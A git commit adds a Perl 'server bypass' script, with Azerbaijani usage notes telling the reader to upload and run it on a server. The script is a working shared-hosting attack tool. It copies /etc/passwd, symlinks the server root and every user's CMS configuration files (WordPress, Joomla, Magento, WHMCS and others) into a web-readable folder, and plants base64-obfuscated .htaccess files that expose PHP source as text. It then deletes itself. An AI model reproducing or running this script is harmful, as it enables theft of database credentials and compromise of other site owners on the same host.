ac8f121554c2306e25397b8dcc1aa3efe6c0cce2
CyBeR CRiMiNaToR <52202656+cybercriminator@users.noreply.github.com>
2023-08-22 13:16:50 +0400

    Create perlsym.pl
    nece isledilir?
    servere upload yada wget
    command:
    perl perlsym.pl

---
+++ ServerBypass/perlsym.pl
@@ -0,0 +1,176 @@
+#!/usr/bin/perl -I/usr/local/bandmin
+# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
+#
+#		Name : RAMIL FEYZIYEV - CYBER CRIMINATOR
+#		https://instagram.com/r4m1l
+#		
+# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
+
+use File::Copy;
+use strict;
+use warnings;
+use MIME::Base64;
+copy("/etc/passwd","passwd.txt") ;
+mkdir "r4m1l";
+symlink("/","r4m1l/root");
+my $filename = 'passwd.txt';
+my $htaccess = decode_base64("T3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzCkRpcmVjdG9yeUluZGV4IEF6ZXJiYWlqYW4uaHRtCkFkZFR5cGUgdGV4dC9wbGFpbiAucGhwIApBZGRIYW5kbGVyIHRleHQvcGxhaW4gLnBocApTYXRpc2Z5IEFueQpJbmRleE9wdGlvbnMgK0NoYXJzZXQ9VVRGLTggK0ZhbmN5SW5kZXhpbmcgK0lnbm9yZUNhc2UgK0ZvbGRlcnNGaXJzdCArWEhUTUwgK0hUTUxUYWJsZSArU3VwcHJlc3NSdWxlcyArU3VwcHJlc3NEZXNjcmlwdGlvbiArTmFtZVdpZHRoPSogCkFkZEljb24gJ2RhdGE6aW1hZ2UvcG5nO2Jhc2U2NCxpVkJPUncwS0dnb0FBQUFOU1VoRVVnQUFBQkFBQUFBUUNBWUFBQUFmOC85aEFBQUFCSE5DU1ZRSUNBZ0lmQWhraUFBQUFBbHdTRmx6QUFBTjF3QUFEZGNCUWlpYmVBQUFBQmwwUlZoMFUyOW1kSGRoY21VQWQzZDNMbWx1YTNOallYQmxMbTl5WjV2dVBCb0FBQUZVU1VSQlZEaU5wWks5U2dOQkZJWFB2WE5uZGpjUm9wWDRVNGtXVnI1QUNoVTdIOEJTZkl0QUhrQjlDWHNyVzBHd0VRdFJ3VktNUnRBVThaY1lXYU5tTTJPeHF5eWlZWmRjR0lhWjRaNzdNZWVRY3c2REZBL1VEVUFBWUhIajhoT0FUajlvUlNlMloxZjJLalAxZmdMa25NUFM1bFcwVmk0cFpvcHZIWERXK0loT3I5OWdYVHprcjlxdlRCTXRyTmQ4QXNMVmNvbVpLRFA2MWtFTGloR0lKOVFCZ08yamRzSUUvSmI1T2FjR0ZBd0RRRWVNRU9abmgxRXFNQ2h0U0I4YTY0QlcyTU5oN1FWaWhDR0tjTkhzd21aMGxBa1lIeEY0UWhCUENLSVlSVTlsNjA1S21HQ0VJVVl6dENZTUJma0VqR1o0T2lId1JRRit2a1FHK3B0QUNJRlJFSlZQUUF2RmYrQnJqb3lRK0NaZnFxMTE4RFJGRWhqZWJiYmVsNmRHaXlUcWYrdlNya2FSUS8wdXRMN21IWGw5dnErZVAzVW5iaC9INWdES2lPRjY3WWViWTBkU0pjUkJtMHoyckZsMnlXcDhBVkRJVzMyZGE3cExBQUFBQUVsRlRrU3VRbUNDJyBeXkRJUkVDVE9SWV5eCkRlZmF1bHRJY29uICdkYXRhOmltYWdlL3BuZztiYXNlNjQsaVZCT1J3MEtHZ29BQUFBTlNVaEVVZ0FBQUJBQUFBQVFDQVlBQUFBZjgvOWhBQUFBQVhOU1IwSUFyczRjNlFBQUFBWmlTMGRFQVA4QS93RC9vTDJua3dBQUFBbHdTRmx6QUFBTEV3QUFDeE1CQUpxY0dBQUFBQWQwU1UxRkI5b0pCaGNUSnYyQjJkNEFBQUpNU1VSQlZEakxiWk85VGh4WkVJVy9xbHZkdE0zOEJOZ0pRbVFnSkdkK0EvTVFCTHdHaml3SDNud2RrU0x0TzJ4RVJHNUxxeFhSU0lSMllEZkQ0R2tHTTBQM3JiNGI5UEF6MGw3cFNsV2xXMGZubkxvbEFJUEI0UFhoNGVGdW51Y0FJSUx3ZEVTZVp5QWlmbnA2K3U5b05MbzNnTTNOelRkSFIrLy96dkpNelN5SktLb2RpSWc4QVhheGVJejFiRFo3TXhxTmZ0Z1NVUkRXeTdMVW5aMGRZbXhBRkFWRWxJNkFFQ3lnSXNRUXNpekxCT0FCQURPaktBcHFoN3U3R29DVVdpd1liZXRvVUhyclBjd0Nxb0YyS1VlWEx6RXpCdjArdVFtU0hNRVo5RjZTWmNyNmk0SXNCT2EvYjdIUU1hSHRJQXdnTGRIYWxEQTFldjBlUWJTanJFclF3SnBxRjRlQXgvaG9xRDEzMm1Na0pyaTV1U09sRmhFaHBVUUlpb2p3YW1PRE5zbGpmVVdDcXBMbk9hYUNTS0p0bmFCQ3NaWWpBbGxtWEk0dmFlb2FWWDBjYlNkaG1VUjN6QUt2TmpZNlZpb28wdFd6Z0VvbktiVytLa0dXdDNVbnQwQ2VHZkpzOWcrVVUwckVHSEgvSHcvTWpINi9UK1BPZEZvUk5LQ2hNMjJ4bU9QZXNwalBHUTZIcE5RMjd0NnNBQ0RTTmFueW9sakRMRWRWYUZPTGU4WmtVaks1dWtxM3Q3OWxQQzcvT0RrNUdhK1k2TzVNcXltTnczVjF5M2h5emZYMGhxdkpMeWJYRmQrK2YyZDNkMGRtcytxdmc0T0R6OGZIeDAvTHNiZTM5NjRzUzcrNHVFanVucHFtU2U2ZTNEM041L04wV1pidGx5OWYwOW5aMlovYjI5djJmTEVldnZLOXF2N2MydG9LaThVaWlRaXFIYm02cmlXNmExM2ZuK3p2NzMrb3FvcmhjTGdLVUZYVlArZm41MitMb25qOElMSjBQOFpJQ0NGOS9QVHBDbGhwQnZnUGVsb0w5VTU1TklBQUFBQUFTVVZPUks1Q1lJST0nCkluZGV4SWdub3JlICoudHh0NDA0CkluZGV4U3R5bGVTaGVldCAnaHR0cDovL2F6eHBsb2l0LmluZm8vc3ltbGluay5jc3MnClJld3JpdGVFbmdpbmUgT24KUmV3cml0ZUNvbmQgJXtSRVFVRVNUX0ZJTEVOQU1FfSBeLioweHN5bTQwNCBbTkNdClJld3JpdGVSdWxlIFwudHh0JCAle1JFUVVFU1RfVVJJfTQwNCBbTCxSPTMwMi5OQ10=");
+my $sym = decode_base64("T3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzCkRpcmVjdG9yeUluZGV4IGluZG94cGxvaXQuaHRtCkhlYWRlck5hbWUgcmFtaWwudHh0ClNhdGlzZnkgQW55CkluZGV4T3B0aW9ucyBJZ25vcmVDYXNlIEZhbmN5SW5kZXhpbmcgRm9sZGVyc0ZpcnN0IE5hbWVXaWR0aD0qIERlc2NyaXB0aW9uV2lkdGg9KiBTdXBwcmVzc0hUTUxQcmVhbWJsZQpJbmRleElnbm9yZSAqCkluZGV4U3R5bGVTaGVldCAnaHR0cDovL2F6eHBsb2l0LmluZm8vc3ltbGluay5jc3Mn");
+open(my $fh1, '>', 'r4m1l/.htaccess');
+print $fh1 "$htaccess";
+close $fh1;
+open(my $xx, '>', 'r4m1l/ramil.txt');
+print $xx "$sym";
+close $xx;
+open(my $fh, '<:encoding(UTF-8)', $filename);
+while (my $row = <$fh>) {
+my @matches = $row =~ /(.*?):x:/g;
+my $istifadeci = $1;
+my @array = (
+	{configdir => '/home/'.$istifadeci.'/.accesshash', type => 'WHM-accesshash' },
+	{configdir => '/home/'.$istifadeci.'/public_html/config/koneksi.php', type => 'Lokomedia' },
+	{configdir => '/home/'.$istifadeci.'/public_html/config/settings.inc.php', type => 'PrestaShop' },
+	{configdir => '/home/'.$istifadeci.'/public_html/app/etc/local.xml', type => 'Magento' },
+	{configdir => '/home/'.$istifadeci.'/public_html/admin/config.php', type => 'OpenCart' },
+	{configdir => '/home/'.$istifadeci.'/public_html/application/config/database.php', type => 'Ellislab' },
+	{configdir => '/home/'.$istifadeci.'/public_html/wp-config.php', type => 'Wordpress' },
+	{configdir => '/home/'.$istifadeci.'/public_html/wp/test/wp-config.php', type => 'Wordpress' },
+	{configdir => '/home/'.$istifadeci.'/public_html/blog/wp-config.php', type => 'Wordpress' },
+	{configdir => '/home/'.$istifadeci.'/public_html/beta/wp-config.php', type => 'Wordpress' },
+	{configdir => '/home/'.$istifadeci.'/public_html/portal/wp-config.php', type => 'Wordpress' },
+	{configdir => '/home/'.$istifadeci.'/public_html/site/wp-config.php', type => 'Wordpress' },
+	{configdir => '/home/'.$istifadeci.'/public_html/wp/wp-config.php', type => 'Wordpress' },
+	{configdir => '/home/'.$istifadeci.'/public_html/WP/wp-config.php', type => 'Wordpress' },
+	{configdir => '/home/'.$istifadeci.'/public_html/news/wp-config.php', type => 'Wordpress' },
+	{configdir => '/home/'.$istifadeci.'/public_html/wordpress/wp-config.php', type => 'Wordpress' },
+	{configdir => '/home/'.$istifadeci.'/public_html/test/wp-config.php', type => 'Wordpress' },
+	{configdir => '/home/'.$istifadeci.'/public_html/demo/wp-config.php', type => 'Wordpress' },
+	{configdir => '/home/'.$istifadeci.'/public_html/home/wp-config.php', type => 'Wordpress' },
+	{configdir => '/home/'.$istifadeci.'/public_html/v1/wp-config.php', type => 'Wordpress' },
+	{configdir => '/home/'.$istifadeci.'/public_html/v2/wp-config.php', type => 'Wordpress' },
+	{configdir => '/home/'.$istifadeci.'/public_html/press/wp-config.php', type => 'Wordpress' },
+	{configdir => '/home/'.$istifadeci.'/public_html/new/wp-config.php', type => 'Wordpress' },
+	{configdir => '/home/'.$istifadeci.'/public_html/blogs/wp-config.php', type => 'Wordpress' },
+	{configdir => '/home/'.$istifadeci.'/public_html/configuration.php', type => 'Joomla' },
+	{configdir => '/home/'.$istifadeci.'/public_html/blog/configuration.php', type => 'Joomla' },
+	{configdir => '/home/'.$istifadeci.'/public_html/submitticket.php', type => '^WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/cms/configuration.php', type => 'Joomla' },
+	{configdir => '/home/'.$istifadeci.'/public_html/beta/configuration.php', type => 'Joomla' },
+	{configdir => '/home/'.$istifadeci.'/public_html/portal/configuration.php', type => 'Joomla' },
+	{configdir => '/home/'.$istifadeci.'/public_html/site/configuration.php', type => 'Joomla' },
+	{configdir => '/home/'.$istifadeci.'/public_html/main/configuration.php', type => 'Joomla' },
+	{configdir => '/home/'.$istifadeci.'/public_html/home/configuration.php', type => 'Joomla' },
+	{configdir => '/home/'.$istifadeci.'/public_html/demo/configuration.php', type => 'Joomla' },
+	{configdir => '/home/'.$istifadeci.'/public_html/test/configuration.php', type => 'Joomla' },
+	{configdir => '/home/'.$istifadeci.'/public_html/v1/configuration.php', type => 'Joomla' },
+	{configdir => '/home/'.$istifadeci.'/public_html/v2/configuration.php', type => 'Joomla' },
+	{configdir => '/home/'.$istifadeci.'/public_html/joomla/configuration.php', type => 'Joomla' },
+	{configdir => '/home/'.$istifadeci.'/public_html/new/configuration.php', type => 'Joomla' },
+	{configdir => '/home/'.$istifadeci.'/public_html/WHMCS/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/whmcs1/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/Whmcs/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/whmcs/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/whmcs/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/WHMC/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/Whmc/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/whmc/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/WHM/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/Whm/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/whm/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/HOST/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/Host/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/host/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/SUPPORTES/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/Supportes/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/supportes/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/domains/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/domain/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/Hosting/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/HOSTING/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/hosting/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/CART/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/Cart/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/cart/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/ORDER/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/Order/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/order/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/CLIENT/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/Client/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/client/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/CLIENTAREA/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/Clientarea/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/clientarea/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/SUPPORT/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/Support/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/support/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/BILLING/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/Billing/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/billing/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/BUY/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/Buy/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/buy/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/MANAGE/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/Manage/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/manage/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/CLIENTSUPPORT/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/ClientSupport/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/Clientsupport/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/clientsupport/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/CHECKOUT/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/Checkout/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/checkout/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/BILLINGS/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/Billings/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/billings/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/BASKET/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/Basket/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/basket/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/SECURE/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/Secure/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/secure/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/SALES/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/Sales/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/sales/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/BILL/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/Bill/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/bill/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/PURCHASE/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/Purchase/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/purchase/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/ACCOUNT/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/Account/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/account/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/USER/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/User/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/user/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/CLIENTS/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/Clients/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/clients/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/BILLINGS/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/Billings/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/billings/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/MY/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/My/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/my/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/secure/whm/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/secure/whmcs/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/panel/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/clientes/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/cliente/submitticket.php', type => 'WHMCS' },
+	{configdir => '/home/'.$istifadeci.'/public_html/support/order/submitticket.php', type => 'WHMCS' }
+);
+foreach (@array){
+	my $configler = $_->{configdir};
+	my $typeconfig = $_->{type};
+	symlink("$configler","r4m1l/$istifadeci-$typeconfig.txt");
+	mkdir "r4m1l/$istifadeci-$typeconfig.txt";
+	symlink("$configler","r4m1l/$istifadeci-$typeconfig.txt/r4m1l.txt");
+	copy("r4m1l/ramil.txt","r4m1l/$istifadeci-$typeconfig.txt/.htaccess") ;
+	}
+}
+print "Content-type: text/html\n\n";
+print "<head><title>Server Bypass 404 By Ramil Feyziyev - Cyber Criminantor</title></head>";
+print '<meta http-equiv="refresh" content="3; url=r4m1l"/>';
+print '<body><center><h1>Ramil Feyziyev - Cyber Criminantor Never Die</h1>';
+print '<a href="r4m1l">Click Me</a>';
+unlink($0);
